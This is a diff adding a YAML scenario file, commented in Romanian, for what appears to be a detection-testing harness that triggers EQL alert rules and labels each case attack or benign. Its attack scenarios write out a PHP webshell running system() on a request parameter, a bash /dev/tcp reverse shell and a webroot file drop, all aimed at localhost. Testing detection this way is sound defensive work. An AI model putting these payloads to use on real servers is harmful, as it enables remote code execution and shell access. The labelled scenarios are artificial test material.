@@ -1,0 +1,33 @@
+# Scenarii pentru CALEA RAPIDA (triaj de alerte, analist L1).
+# Fiecare `generate` declanseaza o regula EQL reala; `rule_name` e numele exact
+# al regulii, dupa care harness-ul preia alerta produsa.
+# Asteptarea de dupa generare trebuie sa acopere si intervalul regulii (5 min).
+scenarios:
+
+  # ===== ATACURI =====
+
+  - name: "Alerta RCE — webshell ruleaza id"
+    path: fast
+    ground_truth: attack
+    rule_name: "RCE: Web server spawns shell"
+    generate: 'printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/a.php >/dev/null && curl -s "http://localhost/a.php?c=id" >/dev/null && sudo rm /var/www/html/a.php'
+
+  - name: "Alerta reverse shell — /dev/tcp"
+    path: fast
+    ground_truth: attack
+    rule_name: "Reverse shell: Interactive shell or /dev/tcp connection"
+    generate: 'timeout 2 bash -c "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1" 2>/dev/null; echo done'
+
+  - name: "Alerta webshell scris in webroot (de www-data)"
+    path: fast
+    ground_truth: attack
+    rule_name: "Webshell: Executable written to webroot"
+    generate: 'printf "%s" "<?php file_put_contents(\"/var/www/html/b.php\",\"x\"); ?>" | sudo tee /var/www/html/drop.php >/dev/null && curl -s "http://localhost/drop.php" >/dev/null; sudo rm -f /var/www/html/drop.php /var/www/html/b.php'
+
+  # ===== BENIGNE =====
+
+  - name: "Alerta download — admin curl catre localhost"
+    path: fast
+    ground_truth: benign
+    rule_name: "Payload download: curl/wget spawned by web server or shell"
+    generate: 'bash -c "curl -s -o /dev/null http://localhost/"'
